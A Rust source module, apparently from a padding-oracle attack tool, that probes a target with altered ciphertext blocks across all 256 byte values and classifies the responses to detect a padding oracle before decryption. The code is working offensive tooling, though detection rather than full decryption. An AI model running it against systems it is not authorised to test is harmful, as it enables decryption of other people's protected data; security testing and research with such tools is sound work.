use std::{collections::HashMap, error::Error, sync::{Arc, atomic::AtomicBool}};

use async_trait::async_trait;
use futures::future::join_all;
use regex::Regex;
use tokio::sync::{Mutex, Semaphore};

use crate::{errors::DecryptError, transport::Transport};

#[derive(PartialEq, Clone, Copy, Debug)]
pub enum DETECT {
    BASELINE,
    OUTLIER,
}

#[async_trait]
pub trait Detector: 'static + Send + Sync {
    async fn check(&self, ct: &[u8]) -> Result<DETECT, DecryptError>;
}

// impl<T: Detector+Clone+'static> DynCloneDetector for T{
//     fn clone_box(&self) -> Box<dyn Detector> {
//         return Box::new(self.clone());
//     }
// }

#[async_trait]
impl<D: Detector + Clone + ?Sized> Detector for Box<D> {
    async fn check(&self, ct: &[u8]) -> Result<DETECT, DecryptError> {
        return self.as_ref().check(ct).await;
    }
}

// impl Clone for Box<dyn Detector>{
//     fn clone(&self) -> Self {
//         return self.clone_box();
//     }
// }

#[derive(Clone)]
pub struct IntermediateDetector {
    base_detector: SimpleDetector,
    pub(crate) block_prefix: Vec<u8>,
    pub(crate) block_suffix: Vec<u8>,
}

impl IntermediateDetector {
    pub async fn init(
        ct: &[u8],
        transport: impl Transport,
        blk_size: usize,
        threads: usize,
        baseline: Option<String>,
        search_pat: Option<Regex>,
        intermediate_block_index: Option<usize>,
        inplace: bool,
    ) -> Result<Self, DecryptError>
    where
        Self: Sized,
    {
        let transport_shared = Arc::new(transport);

        let blocks: Vec<Vec<u8>> = ct
            .chunks(blk_size.into())
            .map(|val| Vec::from(val))
            .collect();
        if blocks.len() < 2 {
            return Err(DecryptError::InvalidInput(
                "Not enough blocks for classic attack".into(),
            ));
        }
        let mut found_transport: Option<(SimpleDetector, Vec<u8>, Vec<u8>)> = None;
        let search_range;
        if let Some(i) = intermediate_block_index {
            search_range = i..i + 1;
        } else {
            search_range = 0..blocks.len();
        }
        for i in search_range {
            let retry = 20;
            for r in 1..retry {
                let index_offset: usize;
                if inplace {
                    index_offset = 0;
                } else {
                    index_offset = 1;
                }
                let ct_prefix = ct[..(i + index_offset) * blk_size].to_vec();
                let ct_suffix;
                if (i + 2) * blk_size > ct.len() - 1 {
                    ct_suffix = vec![];
                } else {
                    ct_suffix = ct[(i + 2) * blk_size..].to_vec();
                }
                let mut inter_ct = [blocks[i].clone(), blocks[i + 1].clone()].concat();
                //scramble the inter ciphertext block in such a way it doesn't affect the suffix much
                inter_ct[0] = inter_ct[0] ^ r as u8;
                let res = _detect(
                    &inter_ct,
                    Some(ct_prefix.clone()),
                    Some(ct_suffix.clone()),
                    transport_shared.clone(),
                    blk_size,
                    threads,
                    baseline.clone(),
                    search_pat.clone(),
                )
                .await;
                if let Ok(detector) = res {
                    found_transport = Some((
                        detector,
                        ct[..(i + 1) * blk_size].to_vec(),
                        ct[(i + 1) * blk_size..].to_vec(),
                    ));
                    break;
                }
            }
            if found_transport.is_some() {
                break;
            }
        }

        if let Some((detector, block_prefix, block_suffix)) = found_transport {
            return Ok(Self {
                base_detector: detector,
                block_prefix,
                block_suffix,
            });
        }
        Err(DecryptError::DifferentialResponses("".to_string()))
    }
}

#[async_trait]
impl Detector for IntermediateDetector {
    async fn check(&self, ct: &[u8]) -> Result<DETECT, DecryptError> {
        self.base_detector.check(&ct).await
    }
}

#[derive(Clone)]
pub struct SimpleDetector {
    padding_valid_resp: String,
    transport: Arc<dyn Transport>,
    semaphore: Arc<Semaphore>,
    search_pat: Option<Regex>,
}

impl SimpleDetector {
    pub async fn init(
        ct_prefix: Option<Vec<u8>>,
        ct: &[u8],
        transport: impl Transport,
        blk_size: usize,
        threads: usize,
        baseline: Option<String>,
        search_pat: Option<Regex>,
    ) -> Result<Self, DecryptError>
    where
        Self: Sized,
    {
        _detect(
            ct, ct_prefix, None, transport, blk_size, threads, baseline, search_pat,
        )
        .await
    }
}

#[async_trait]
impl Detector for SimpleDetector {
    async fn check(&self, ct: &[u8]) -> Result<DETECT, DecryptError> {
        let sem = self
            .semaphore
            .acquire()
            .await
            .expect("Error: semaphore closed");
        let mut res = DETECT::BASELINE;
        if let Ok(result) = self.transport.exec(ct, None, None).await {
            if let Some(ref pat) = self.search_pat
                && pat.is_match(&result).to_string() == self.padding_valid_resp
            {
                res = DETECT::OUTLIER
            } else if self.search_pat.is_none() && result == self.padding_valid_resp {
                res = DETECT::OUTLIER
            }
        }
        drop(sem);
        return Ok(res);
    }
}

pub async fn find_baseline_response(
    ct: &[u8],
    transport: impl Transport + Clone,
    search_pat: Option<Regex>,
    threads: usize,
) -> Result<String, Box<dyn Error + Send>> {
    let semaphore =  Arc::new(Semaphore::new(threads));
    let prev_result = Arc::new(Mutex::new(None));
    let found_err = Arc::new(AtomicBool::new(false));
    let mut futures = vec![];
    for _ in 0..10 {
        let prev_result = prev_result.clone();
        let transport = transport.clone();
        let search_pat = search_pat.clone();
        let found_err = found_err.clone();
        let semaphore = semaphore.clone();
        futures.push(async move{
            let sem = semaphore.acquire().await.expect("Error: semaphore closed");
            let response;
            let response_raw = transport.exec(ct, None, None).await;
            drop(sem);
            if response_raw.is_err(){
                found_err.store(true, std::sync::atomic::Ordering::SeqCst);
                return;
            }
            let response_raw = response_raw.unwrap();
            if let Some(ref pat) = search_pat {
                response = pat.is_match(&response_raw).to_string();
            } else {
                response = response_raw;
            }
            let mut prev_result = prev_result.lock().await;
            if let Some(prev) = (*prev_result).clone()
                && prev != response
            {
                found_err.store(true, std::sync::atomic::Ordering::SeqCst);
                return;
            } else {
                *prev_result = Some(response);
            }
        });
    }
    let _ = join_all(futures).await;
    if found_err.load(std::sync::atomic::Ordering::SeqCst){
        return Err(Box::new(DecryptError::BaselineError()));
    }
    return Ok(prev_result.lock().await.as_ref().unwrap().to_owned());
}

async fn _detect(
    ct: &[u8],
    ct_prefix: Option<Vec<u8>>,
    ct_suffix: Option<Vec<u8>>,
    transport: impl Transport,
    blk_size: usize,
    threads: usize,
    baseline: Option<String>,
    search_pat: Option<Regex>,
) -> Result<SimpleDetector, DecryptError> {
    let semaphore = Arc::new(Semaphore::new(threads));
    let blocks: Vec<Vec<u8>> = ct
        .chunks(blk_size.into())
        .map(|val| Vec::from(val))
        .collect();
    if blocks.len() < 2 {
        return Err(DecryptError::InvalidInput(
            "Not enough blocks for classic attack".into(),
        ));
    }

    // though we could use anything for the first block for a basic padding transport, when we're doing the intermediate transport attack,
    // we need to take the first block as is
    let last_blocks_shared = Vec::from([
        blocks[blocks.len() - 2].clone(),
        blocks[blocks.len() - 1].clone(),
    ]);

    // map format is (Response key, (# of occurrences, Response text))
    let response_map_shared: Arc<Mutex<HashMap<String, (u16, String)>>> =
        Arc::new(Mutex::new(HashMap::new()));

    let transport_shared = Arc::new(transport);

    //perform detection phase
    let mut futures_set = vec![];
    for i in 0..=255 {
        let mut last_blocks = last_blocks_shared.clone();
        let response_map = response_map_shared.clone();
        let transport = transport_shared.clone();
        let ct_prefix_copy = ct_prefix.clone();
        let ct_suffix_copy = ct_suffix.clone();
        let search_pat = search_pat.clone();
        let semaphore = semaphore.clone();
        futures_set.push(async move {
            last_blocks[0][blk_size as usize - 1] = i;
            let sem = semaphore
                .acquire()
                .await
                .expect("Error: semaphore closed");
            let response_result = transport
                .exec(
                    &last_blocks.iter().flatten().cloned().collect::<Vec<u8>>(),
                    ct_prefix_copy,
                    ct_suffix_copy,
                )
                .await;
            drop(sem);
            if let Ok(response) = response_result {
                let response_key;
                if let Some(search) = search_pat {
                    response_key = search.is_match(&response).to_string();
                } else {
                    response_key = response;
                }
                let mut response_map_acquired = response_map.lock().await;
                let (num_response, response_text) = response_map_acquired
                    .get(&response_key)
                    .unwrap_or(&(0, String::new()))
                    .to_owned();
                response_map_acquired.insert(response_key, (num_response + 1, response_text));
            }
        });
    }
    join_all(futures_set).await;
    let response_map_acquired = response_map_shared.lock().await;
    if response_map_acquired.keys().len() <= 1 {
        return Err(DecryptError::DifferentialResponses(
            "No unique responses found".into(),
        ));
    } else if response_map_acquired.keys().len() > 3 {
        println!(
            "too many unique responses found {}, try using the -s parameter to distinguish success/error messages",
            response_map_acquired.keys().len()
        );
        return Err(DecryptError::DifferentialResponses(
            "Too many unique responses found, may not be from a padding error".into(),
        ));
    }
    let padding_valid_resp;
    if let Some(base) = baseline
        && response_map_acquired.contains_key(&base)
    {
        padding_valid_resp = base;
    } else {
        println!("Baseline Response not found during detection phase.");
        return Err(DecryptError::BaselineError());
    }
    let detector = SimpleDetector {
        padding_valid_resp: padding_valid_resp.to_owned(),
        transport: transport_shared.clone(),
        semaphore,
        search_pat,
    };
    return Ok(detector);
}
